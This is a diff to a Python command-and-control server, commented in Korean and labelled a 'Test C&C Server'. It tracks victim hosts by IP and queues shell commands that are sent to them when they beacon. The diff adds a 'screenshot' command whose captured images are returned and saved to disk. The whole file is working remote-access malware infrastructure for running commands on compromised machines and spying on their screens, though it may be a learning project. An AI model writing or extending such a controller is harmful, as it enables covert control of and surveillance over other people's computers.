@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
-# pip install scapy
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from struct import unpack, pack
-from scapy.all import *
+from struct import unpack
 from collections import deque
+from datetime import datetime
 
 import threading
-import sys
+
 
 
 # 커스텀 프로토콜의 타입을 정의해둔 클래스
@@ -45,6 +44,18 @@ class CustomProtocol(TypeTable):
 
 class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
     
+    # 모듈에서 제공하는 로그 시스템 off
+    def log_message(self, format, *args):
+        return
+
+    # log 출력
+    def print_log(self, message, warning=False):
+        if LOG_PRINT == False:
+            return
+        log_type = "[*]" if not warning else "[!]"
+
+        print("{0} {1}".format(log_type, message))
+
     # hex 값에 따른 type string을 리턴
     def _get_type(self, type_num):
         for k, v in self.TYPE_LIST.items():
@@ -63,11 +74,14 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
     
     # parsing된 데이터 출력 메서드
     def _print_parsed_data(self, parsed_data):
-        print('==parsed data==')
-        for header, value in parsed_data.items():
-            if header == 'data':
-                value = value.decode(ENCODING)
-            print('{0} : {1}'.format(header, value))
+        self.print_log('==parsed data==')
+        try:
+            for header, value in parsed_data.items():
+                if header == 'data':
+                    value = value.decode(ENCODING)
+                self.print_log('{0} : {1}'.format(header, value))
+        except UnicodeDecodeError as e:
+            self.print_log('[!] not utf-8 data', True)
 
     # 기본 헤더 정의
     def _set_header(self, header={}):
@@ -91,10 +105,21 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
 
         queue = COMMAND_QUEUE[ip]
 
-        print(queue)
+        element = queue.popleft()
+        
+        if not element.startswith(b'sh '):
+            return element
 
-        while queue:
-            command += queue.popleft() + b";"
+        while True:
+            if not element.startswith(b'sh '):
+                queue.appendleft(element)
+                break
+            if not queue:
+                break
+
+            command += element + b";"
+            element = queue.popleft()
+
         return command[:-1]
 
     # command response
@@ -108,16 +133,23 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
         self._set_header()
         protocol_data = bytes(CustomProtocol('NONE', 0, b''))
         self.wfile.write(protocol_data)
+
+    def _ftp_request(self, data):
+        self._set_header()
+        protocol_data = bytes(CustomProtocol('FTP_REQUEST', 0, data))
+        self.wfile.write(protocol_data)
     
     # victim 딕셔너리에 ip 추가
     def _add_victim_ip(self, ip):
         global VICTIM_LIST
         global COMMAND_QUEUE
         global SEQUENCE_DATA
+        global FILE_NAME_LIST
         if ip not in VICTIM_LIST:
             VICTIM_LIST[ip] = ip
             COMMAND_QUEUE[ip] = deque()
             SEQUENCE_DATA[ip] = [1, b""]
+            FILE_NAME_LIST[ip] = deque()
 
     def _check_sequence(self, seq, data, client_ip):
         global SEQUENCE_DATA
@@ -133,9 +165,21 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
             print('==splited data==\n{}\n'.format(SEQUENCE_DATA[client_ip][1]))
             SEQUENCE_DATA[client_ip][1] = b""
             SEQUENCE_DATA[client_ip][0] = 1
+    
+    def save_file(self, file_name, data):
+        try:
+            with open(file_name, 'wb') as f:
+                f.write(data)
+        except Exception as e:
+            self.print_log('[!] file save error\nMessage : {}'.format(str(e)), True)
+            return False
+        
+        self.print_log('[*] {} save success'.format(file_name))
+        return True
 
     # POST 요청이 들어올 시 처리해주는 코드
     def do_POST(self):
+        global FILE_NAME_LIST
 
         data_string = self.rfile.read(int(self.headers['Content-Length'])) # post body data를 읽어서 data_string에 저장
         client_ip = self.client_address[0]                                 # 접속 ip get
@@ -164,6 +208,9 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
             # 오류 발생시 오류 문구를 리턴
             self._set_header()
             self.wfile.write('[!] Invalid Header\nError Message : {}'.format(str(e)).encode('utf-8'))
+            self.print_log()
+            print_victims()
+            print('> ', end='')
             return
 
         # type 별 처리
@@ -171,38 +218,60 @@ class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
             command = self._pop_queue(client_ip)
 
             if command:
-                self._command_execute_response(command)
-                print('[*] send command\n[*] target : {0}\n[*] command : {1}'.format(client_ip, command))
+                if command == b'screenshot':
+                    FILE_NAME_LIST[client_ip].append(datetime.now().strftime('%Y%m%d-%H%M%S') + '.jpg')
+                    self._ftp_request(command)
+                else:
+                    self._command_execute_response(command)
+                    self.print_log('[*] send command\n[*] target : {0}\n[*] command : {1}'.format(client_ip, command))
             else:
                 self._becon_ack_response()
         elif parsed_data['type'] == 'SHELL_RESPONSE': # SHELL_RESPONSE
-            print('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
+            self.print_log('[*] execute result\n{}'.format(parsed_data['data'].decode(ENCODING)))
             self._becon_ack_response()
+        elif parsed_data['type'] == 'FTP_RESPONSE':
+            if len(FILE_NAME_LIST[client_ip]) > 0:
+                file_name = FILE_NAME_LIST[client_ip].popleft()
+                self.save_file(file_name, parsed_data['data'])
+                self._becon_ack_response()
+            else:
+                self.print_log('[!] file queue error\nThere is no data in file name queue', True)
         else:
             self._becon_ack_response()
 
         # 예쁘게 출력하기 위한 코드
-        print()
-        print_victims()
-        print('> ', end='')
+        if LOG_PRINT:
+            print()
+            print_victims()
+            print('> ', end='')
 
-
+# True : 로그 출력
+# False : 로그 출력 x
+LOG_PRINT = False
 
 # 서버 주소와 포트
 # 자신의 ip, port로 설정
-SERVER_INFO = ('192.168.21.1', 80)
+SERVER_INFO = ('127.0.0.1', 80)
 
 # encoding
-ENCODING = 'ansi'
+ENCODING = 'cp949'
+
+# save path for ftp response
+FILE_SAVE_PATH = './'
 
 # 피해자 ip 및 여러 정보들을 담을 딕셔너리
 VICTIM_LIST = {} # hostname : ip 
 COMMAND_QUEUE = {} # ip : command queue
 SEQUENCE_DATA = {} # ip : [next sequence num, data]
+FILE_NAME_LIST = {} # ip : [fileName queue]
+
+SUPPORTED_COMMAND = ['screenshot', 'sh']
 
 menu_message = '''==Test C&C Server==
 Enter the command sending to the victim
-ex) [victim name]|[command]'''
+ex) [victim name]|sh [shell command]
+ex2) [victim name]|screenshot
+'''
 
 print(menu_message)
 
@@ -223,21 +292,29 @@ try:
     httpd = HTTPServer(SERVER_INFO, HTTPHandler)
 
     http_server_thread = threading.Thread(target=httpd.serve_forever)
+    http_server_thread.daemon = True
     http_server_thread.start()
 except Exception as e:
     print('[!] HTTP Server Open Error / {}'.format(str(e)))
     exit(0)
 
 # <hostname>|<command> 방식으로 입력된 데이터를 파싱하여 큐에 저장
+# shell request를 보낼 경우 <hostname> | sh <shell command>
 while True:
     print_victims()
     try:
-        victim, command = input('> ').split('|')
+        inputVal = input('> ')
+        if inputVal == 'exit':
+            break
+
+        victim, command = inputVal.split('|')
     except:
         print('[!] invalid command\n')
         continue
 
-    if victim in VICTIM_LIST:
+    if victim in VICTIM_LIST and command.split()[0] in SUPPORTED_COMMAND:
         add_command(victim, command)
     else:
-        print('[!] victims not found\n')
+        print('[!] victims or command not found\n')
+
+exit(0)
